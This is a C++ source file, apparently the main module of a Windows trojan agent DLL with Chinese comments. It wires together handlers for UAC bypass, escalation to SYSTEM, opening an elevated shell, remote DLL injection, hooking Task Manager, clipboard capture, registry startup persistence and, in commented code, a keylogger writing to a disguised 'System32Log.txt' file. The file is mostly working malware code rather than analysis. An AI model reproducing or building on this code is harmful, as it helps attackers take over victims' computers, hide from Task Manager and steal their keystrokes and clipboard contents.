// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <winternl.h>
#include <shellapi.h>
#include <Shlobj_core.h>

#include "export.h"
#include "handlers/get_system.h"
#include "runtime/utils.h"
#include "handlers/keylog.h"
#include "handlers/uac_bypass.h"
#include "handlers/remote_dll_injection.h"
#include "handlers/taskmgr_hook.h"
#include "handlers/clipboard.h"
#include "handlers/process_list.h"
#include "handlers/startup.h"

HINSTANCE hInst = NULL;                                // 当前实例
WCHAR executable_path[MAX_PATH + 1];
WCHAR module_path[MAX_PATH + 1];
WCHAR* commandline;
BOOL stand_alone = false;
HINSTANCE hModule;   // dll模块实例

std::ofstream ofs; // 打开的文件流
bool file_opened; // 是否打开文件

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    wchar_t* tmp = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ::hModule = hModule;
        GetModuleFileName(NULL, executable_path, MAX_PATH);
        GetModuleFileName(hModule, module_path, MAX_PATH);
        tmp = lstrcat_heap(L"C:\\Windows\\System32\\rundll32.exe ", module_path);
        commandline = lstrcat_heap(tmp, L",EntryPoint ");
        free(tmp);
        if (!_wcsicmp(executable_path, L"C:\\Windows\\System32\\rundll32.exe"))
        {
            MessageBox(0, L"Running", 0, 0);
            stand_alone = true;
        }
        else if (!_wcsicmp(executable_path, L"C:\\WINDOWS\\system32\\taskmgr.exe"))
        {
            SetHook();
        }
        else {
            MessageBox(0, L"Injected", 0, 0);
            MessageBox(0, executable_path, 0, 0);
            EntryPoint(NULL, NULL, "", 0);
        }
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        if (file_opened)
        {
            ofs.close();
        }
        break;
    }
    return TRUE;
}

extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCSTR lpszCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(nCmdShow);
    ::hInst = hinst; // 将实例句柄存储在全局变量中

    //elevate_execute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
    if (!strcmp(lpszCmdLine, "systemshell"))
    {
        MessageBox(0, L"systemshell", 0, 0);
        BypassUAC(L"getsystem");
        return;
    }
    else if (!strcmp(lpszCmdLine, "getsystem"))
    {
        MessageBox(0, L"getsystem", 0, 0);
        GetSystem(L"getshell");
        return;
    }
    else if (!strcmp(lpszCmdLine, "getshell"))
    {
        MessageBox(0, L"getshell", 0, 0);
        ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
        Sleep(10000);
        return;
    }
    else if (!strcmp(lpszCmdLine, "injecttest"))
    {
        MessageBox(0, L"injecttest", 0, 0);
        InjectDll(12008, module_path);
        while (true) Sleep(1000);
        return;
    }
    else if (!strcmp(lpszCmdLine, "getsystemtest"))
    {
        MessageBox(0, L"getsystemtest", 0, 0);
        ConsoleInit();
        ElevatedExecute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
        ElevateSelf();
        while (true) Sleep(1000);
        return;
    }
    else if (!strcmp(lpszCmdLine, "uactest"))
    {
        MessageBox(0, L"uactest", 0, 0);
        ConsoleInit();
        BypassUAC(L"C:\\Windows\\System32\\cmd.exe", NULL);
        // 使用whoami /all 命令来看看是不是privilege变多了。
        while (true) Sleep(1000);
        return;
    }
    else if (!strcmp(lpszCmdLine, "cliptest"))
    {
        MessageBox(0, L"cliptest", 0, 0);
        ConsoleInit();
        while (true)
        {
            Sleep(1000);
            _putws(GetClipboardTextHelper());
        }
        return;
    }
    else if (!strcmp(lpszCmdLine, "proclisttest"))
    {
        MessageBox(0, L"proclisttest", 0, 0);
        ConsoleInit();
        MY_PROC* head = NULL;
        
        while (true)
        {
            head = CreatProcList();
            PrintProcList(head);
            DestroyProcList(head);
            head = NULL;
            Sleep(1000);

        }
        return;
    }
    else if (!strcmp(lpszCmdLine, "startuptest"))
    {
        MessageBox(0, L"startuptest", 0, 0);
        ConsoleInit();
        SetStratupReg();
        MessageBox(0, L"Created", 0, 0);
        DeleteStratupReg();
        while (true) Sleep(1000);
        return;
    }
    //RawInputKeyLogger.KeyLoggerInit(&ofs);
    //RawInputKeyLogger.KeyLoggerInit(&std::cout);
    
    //ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
    
    //if (stand_alone)
    //{
    //    injectDll(16524, L"C:\\Users\\warren\\d\\torjan\\anonytor-agent-windows\\x64\\Debug\\anonytor-agent-windows.dll");
    //    MSG msg;
    //    while (GetMessage(&msg, nullptr, 0, 0))
    //    {
    //        TranslateMessage(&msg);
    //        DispatchMessage(&msg);
    //    }
    //}
    //else {
    //    // 注入explorer的时候咋
    //    LPWSTR path = NULL;
    //    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DEFAULT, NULL, &path);
    //    if (!SUCCEEDED(hr)) {
    //        ErrorExit(L"SHGetKnownFolderPath Error");
    //    }
    //    LPWSTR file_path = lstrcat_heap(path, L"\\Temp\\System32Log.txt");
    //    std::wcout << file_path << std::endl;
    //    ofs.open("C:\\Users\\warren\\AppData\\Local\\Temp\\System32Log.txt");
    //    file_opened = true;
    //    RawInputKeyLogger.KeyLoggerInit(&ofs);
    //    //ofs << "hello?";
    //    //ofs.close();
    //    //while (true) Sleep(1000);
    //}
    ConsoleInit();
    //HookKeyLogger.KeyLoggerInit(&std::cout);
    //printf("%u", GetPIDByName(L"taskmgr.exe"));
    StartScanningThread();
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        //puts(".");
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    //return;
}
